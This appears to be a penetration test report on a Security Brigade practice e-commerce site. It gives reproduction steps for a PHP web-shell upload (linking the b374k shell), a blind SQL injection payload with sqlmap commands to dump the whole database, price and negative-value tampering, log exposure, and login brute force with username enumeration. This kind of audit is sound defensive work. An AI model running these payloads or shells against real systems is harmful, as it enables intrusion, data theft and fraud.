### Aduit report for SECURITY BRIGADE. 

## Contents
- Date

- Scope

- Vulnerabilites
  
 - Critical Impact
    - Remote Code Execution from upload.
    - Blind sql leading to db dump.
 
 - High Impact
    - Buying anything at any price.
    - Filling Up account balance as integers are your friends.
    
  
  - Medium Impact
    - Information disclosure via logs.
    
  - Low Impact
    - No rate limit leading to account takeover.

    
## Date
A pentest aduit was performed for the **SECURITY BRIGADE** at **Wednesday, 30 September 2020**. 

## Scope
Scope was limited to: **http://foophones.securitybrigade.com:8080/**

## Vulnerabilites
Vulnerabilites founded are listed according to their impact levels, explanations, and potential recommendations.

### Critical Impact
##### Remote Code Execution from upload.
It was found that the upload functionality located at Register page is vulnerable to rce.

###### Steps To Reporduce:

1) Visit **http://foophones.securitybrigade.com:8080/register.php** try to resgister a username and upload a file ( I added shivshell.php)

2) Intercept the request in burp which shloud look some thing like,
- Request => 
```
POST /register_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 715
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5mUqBA2v8K1dcRb0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=4fpnkj94edkf83ug1ge89keni4
Connection: close

------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="fname"

shivang3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="lname"

kumar3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="country"

india3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="user"

shivang3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="pass"

password
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="avatar"; filename="shivshell.php"
Content-Type: application/octet-stream

<?php.......

------WebKitFormBoundary5mUqBA2v8K1dcRb0--
```

3) Request the image file 
**http://foophones.securitybrigade.com:8080/images/avatars/shivshell.php**

4) You shloud see something like this (depends on what kind of shell you upload, Used => https://raw.githubusercontent.com/The404Hacking/b374k-mini/master/b374k.php)
![Alt Text](https://i.ibb.co/m5y1sPR/rce.png)

###### Impact:
Attacker can upload malicious files into the backend servers and execute commands

###### Recommendation:
Uploaded data should have a proper file/extension/mime declared before passing it to the database.

##### Blind sql injection leading to db dump.
It was found that the same registration endpoint was aslo vulnerable to blind sql injection which leads to internal file dumps.

###### Steps To Reproduce: 
1) Visit **http://foophones.securitybrigade.com:8080/register.php** try toresgister a username and upload a file like above attack.

2) Intercept the request in burp which shloud look some thing like,
- Request => 
```
POST /register_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 768
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq47yQI2jPO4y7p7J
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; PHPSESSID=snc73obo8lnvbkvmjng7q13941
Connection: close

------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="fname"

shivangattacker
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="lname"

attackershivang
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="country"

attacker
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="user"

attacker
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="pass"

attacker
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="avatar"; filename="csrf.html"
Content-Type: text/html

Test

------WebKitFormBoundaryq47yQI2jPO4y7p7J--
```
3) Copy the request into a txt file and pass it to sqlmap like,
```python
python3 sqlmap.py -r test.txt --level=3 --risk=3 --batch
```

4) Which will generate a payload for blind sqli poc like,
- Request =>
```
POST /register_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 768
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq47yQI2jPO4y7p7J
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; PHPSESSID=snc73obo8lnvbkvmjng7q13941
Connection: close

------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="fname"

shivangattacker
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="lname"

attackershivang
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="country"

attacker
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="user"

attacker' AND (SELECT 1196 FROM (SELECT(SLEEP(5)))VOOo) AND 'FrTW'='FrTW
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="pass"

attacker
------WebKitFormBoundaryq47yQI2jPO4y7p7J
Content-Disposition: form-data; name="avatar"; filename="csrf.html"
Content-Type: text/html

Test

------WebKitFormBoundaryq47yQI2jPO4y7p7J--
```
5) Above request will make the web app to sleep for 5 sec 

![Alt Text](https://i.ibb.co/FKQRWP7/sqlblind.png)

6) Modify the python command to now dump the db.
```python
python3 sqlmap.py -r test.txt --level=3 --risk=3 --batch --dbms=mysql --threads=10 --dump-all
```
7) Shloud see db getting dumped

![Alt Text](https://i.ibb.co/Qpw8sDq/dump-db.png)

8) Later it was found that what function leads to this
```
function check_user(user) {


plainajax.request('respurl: check_user.php?user=' +  user + '; resultloc: response; ');

}

function add_user(user,name,surname) {
plainajax.request('respurl: add_user.php?user=' +  user + '&name=' + name + '&surname=' + surname +'; resultloc: response; ');

}
```
9) Availabe at **http://foophones.securitybrigade.com:8080/scripts/functions.js**, code is passing whatever gets into the paramters.

###### Impact: 
Attacker can easily dump the whole server's db.

###### Recommendation:
Have a waf or sanitize user input before sending it to db
 

### High Impact

##### Buying anything at any price.
It was found that an attacker can buy anything from **http://foophones.securitybrigade.com:8080/buy_confirm.php** regardless of what amount of credit is availabe in his/her account

###### Steps To Reproduce: 

1) Try to buy any product like **http://foophones.securitybrigade.com:8080/buy.php?id=1** and click on purchase and intercept the request in burp
- Request => 
```
POST /buy_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/buy.php?id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

shipping=Finding&price=29&id=1
```

2) Change the price parameterpresent in body section to any value like price=1 and request it 
- Request => 
```
POST /buy_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/buy.php?id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

shipping=Finding&price=1&id=1
```
3) Shloud get a response like,
- Response (interesting part only!) =>
```
					
					<font color=green>Thank you for your purchase! The product will be shipped to : Finding</font>		</div>
		<div id="sidebar">		
		
		
		<h2>Your credit is now: $98</h2>


Filling account !
```
###### Impact:
Attacker can buy anything at any price.

###### Recommendation:
  User supplied data shloud be propelry checked before sending it to backend.

##### Filling up account balance as integers are your friends.
It was found that the same above attack senerio could be used by an attacker to fill his/her account. By manipulating the price parameter using negatives.

###### Steps To Reproduce: 

1)Try to buy any product like **http://foophones.securitybrigade.com:8080/buy.php?id=1** and click on purchase and intercept the request in burp 
- Request => 
```
POST /buy_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/buy.php?id=5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

shipping=chekc&price=29&id=5
```
2) Change the price parameter present in body section to any negative value like -1000 and send the request.

- Response (interesting part only!) =>
```
font color=green>Thank you for your purchase! The product will be shipped to : chekc</font>		</div>
		<div id="sidebar">		
		
		
		<h2>Your credit is now: $7573</h2>
		
				
		</div>
		<div style="clear: both;">&nbsp;</div>
	</div>
	<div id="footer">
		<p>&copy;&nbsp;Copyright 2009. Security Brigade </p>
	</div>
```
![Alt Text](https://i.ibb.co/NTPKp7B/screencapture-foophones-securitybrigade-8080-myaccount-php-2020-09-30-00-34-25.png)

###### Impact:
Attacker can fill his credit without any limitations

###### Recommendation:
 Backend code shloud handel the intergers carefully.
  
### Medium Impact

##### Information disclosure via logs.
It was found that **/logs.txt** and **/logs** where exposed at **http://foophones.securitybrigade.com:8080/logs**  or **http://foophones.securitybrigade.com:8080/logs.txt** which contains response for backend servers

###### Steps To Reproduce: 
1) Just visit **http://foophones.securitybrigade.com:8080/logs**  or **http://foophones.securitybrigade.com:8080/logs.txt** 

2) Should get something like,
![Alt Text](https://i.ibb.co/PWzj17q/logs.png)

###### Impact:
This infomation can lead to a an issue if it contains critical informations.

###### Recommendation: 
It best  not make these endpoints public or having a proper 403 forbidden access in place can fix it too.


### Low Impact

##### No rate limit leading to account takeover.
It was found that there is not rate limit implementation were in place at **http://foophones.securitybrigade.com:8080/login.php** which could lead to account takeover via brute force.

###### Steps To Reproduce: 
1) Visit **http://foophones.securitybrigade.com:8080/login.php** and try to fill creds and intercept the request in burp,

- Request =>
```
POST /login.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

user=attacker&pass=password
```
2) Should get response like (If it's invalid creds set)
Response => 
```
HTTP/1.1 302 Found
Date: Wed, 30 Sep 2020 08:52:54 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Location: login.php
Vary: Accept-Encoding
Content-Length: 0
Connection: close
Content-Type: text/html
```
![Alt Text](https://i.ibb.co/Gp4m1mD/invalid-login.png)

3) Now send the request to Intruder in burp and config it like these,

- Add position 
![Alt Text](https://i.ibb.co/jDBJcRB/intruder1.png)

- Select wordlist
![Alt Text](https://i.ibb.co/QCYV5C0/intruder2.png)

- Set threads and grep response
![Alt Text](https://i.ibb.co/pyF1H0h/intruder3.png)

- Star the attack and then filter which greped in reponse
![Alt Text](https://i.ibb.co/52J7wqZ/intruder4.png)

5) Now enter the valid creds and login
![Alt Text](https://i.ibb.co/L8RVGSk/valid-login.png)

Which now contains a redirection for ** myaccount.php** endpoint.

6) Attacker just need to know the usernames which could be enumerated from register section as it tends to show if  username exists or not. Like,

- Request =>
```
GET /check_user.php?user=shivang&timeStamp=1601451674798 HTTP/1.1
Host: foophones.securitybrigade.com:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Referer: http://foophones.securitybrigade.com:8080/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=4fpnkj94edkf83ug1ge89keni4
Connection: close
```
- Response =>
```
HTTP/1.1 200 OK
Date: Wed, 30 Sep 2020 07:39:23 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 40
Connection: close
Content-Type: text/html


<font color=red>Username exists</font>
```
7) Which says if username is availabe in web app or not

###### Impact:
Attacker can takeover user's account

###### Recommendation: 
Having a google captcha can fix this issue while login.
